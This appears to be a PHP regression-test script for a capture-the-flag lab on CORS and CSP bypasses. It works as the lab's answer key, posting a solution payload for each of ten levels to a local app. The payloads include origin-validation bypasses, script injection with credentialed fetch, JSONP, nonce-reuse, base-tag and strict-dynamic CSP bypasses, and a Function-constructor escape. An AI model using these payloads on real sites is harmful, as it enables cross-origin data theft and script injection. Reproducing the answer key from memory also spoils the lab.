<?php
/**
 * Self-test: runs the intended solution for every level against the live app
 * and reports whether the flag came back. Run inside the container:
 *
 *   docker compose exec web php /var/www/html/solve_check.php
 *
 * Not part of the challenge - it exists so the lab can be regression-tested.
 */
require_once __DIR__ . '/helpers.php';

$base = 'http://localhost';
$pass = 0;
$fail = 0;

function post(string $url, array $fields): string
{
    $ctx = stream_context_create(['http' => [
        'method'        => 'POST',
        'header'        => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content'       => http_build_query($fields),
        'timeout'       => 15,
        'ignore_errors' => true,
    ]]);
    return (string)@file_get_contents($url, false, $ctx);
}

function check(int $level, string $body): void
{
    global $pass, $fail;
    $want = bp_flag($level);
    if (strpos($body, $want) !== false) {
        $pass++;
        echo "  PASS  level $level  $want\n";
    } else {
        $fail++;
        echo "  FAIL  level $level  (expected $want)\n";
    }
}

echo "CORS & CSP Lab self-test\n------------------------\n";

/* --- CORS ---------------------------------------------------------- */

/* 1 - the origin is reflected, so any origin works */
check(1, post("$base/level1.php", ['origin' => 'https://attacker.test']));

/* 2 - the allowlist contains the literal string null */
check(2, post("$base/level2.php", ['origin' => 'null']));

/* 3 - the regex has no end anchor: append your own domain */
check(3, post("$base/level3.php", ['origin' => 'https://portal.hackinlab.internal.evil.test']));

/* 4 - the suffix test has no dot: prepend a label instead */
check(4, post("$base/level4.php", ['origin' => 'https://evilhackinlab.internal']));

/* 5 - a host inside the wildcard, taken over through its own reflection */
check(5, post("$base/level5.php", [
    'origin' => 'http://legacy.hackinlab.internal',
    'note'   => "<script>fetch('/api.php?level=5',{credentials:'include'})</script>",
]));

/* --- CSP ----------------------------------------------------------- */

/* 6 - 'self' includes the JSONP endpoint, which returns the callback verbatim */
check(6, post("$base/level6.php", [
    'payload' => '<script src="/jsonp.php?callback=hlab.win()//"></script>',
]));

/* 7 - the nonce is seeded per day, so today's value is the same everywhere */
$nonce7 = bp_daily_nonce();
check(7, post("$base/level7.php", [
    'payload' => '<script nonce="' . $nonce7 . '">hlab.win()</script>',
]));

/* 8 - no base-uri: move the document base and the nonce follows the element.
       127.0.0.1 is a different origin from localhost even on one machine. */
check(8, post("$base/level8.php", [
    'payload' => '<base href="http://127.0.0.1/attacker/">',
]));

/* 9 - 'unsafe-eval' plus a denylist over an expression language */
check(9, post("$base/level9.php", [
    'payload' => "\${''['con'+'structor']['con'+'structor']('hlab.win()')()}",
]));

/* 10 - strict-dynamic trusts loader.js, and loader.js trusts the DOM */
check(10, post("$base/level10.php", [
    'payload' => '<div data-main="http://127.0.0.1/attacker/widget.js"></div>',
]));

/* --- alternative solutions, reported but not counted ---------------- */

$alt = [
    'level 2 via an origin the browser serialises the same way'
        => ['level2.php', ['origin' => 'null'], 2],
    'level 6 with a different callback name'
        => ['level6.php', ['payload' => '<script src="/jsonp.php?callback=window.hlab.win()//"></script>'], 6],
    'level 9 reaching Function through the data object instead of a literal'
        => ['level9.php', ['payload' => "\${d.name['con'+'structor']['con'+'structor']('hlab.win()')()}"], 9],
    'level 10 with the attribute on a different element'
        => ['level10.php', ['payload' => '<span data-main="http://127.0.0.1/attacker/widget.js"></span>'], 10],
];
foreach ($alt as $label => [$page, $fields, $lvl]) {
    $body = post("$base/$page", $fields);
    echo strpos($body, bp_flag($lvl)) !== false
        ? "  ok    alternative: $label\n"
        : "  WARN  alternative did not land: $label\n";
}

echo "------------------------\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
